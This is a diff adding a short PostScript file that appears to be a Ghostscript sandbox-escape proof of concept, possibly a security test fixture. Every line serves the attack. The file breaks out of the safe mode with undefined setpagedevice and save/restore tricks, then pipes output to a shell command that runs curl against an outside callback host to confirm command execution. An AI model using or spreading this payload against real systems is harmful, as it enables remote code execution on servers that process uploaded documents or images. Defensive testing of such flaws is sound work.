@@ -1,0 +1,15 @@
+%!PS
+
+userdict /setpagedevice undef
+
+save
+
+legal
+
+{ null restore } stopped { pop } if
+
+{ legal } stopped { pop } if
+
+restore
+
+mark /OutputFile (%pipe%curl http://f1iodp.ceye.io/whoami) currentdevice putdeviceprops
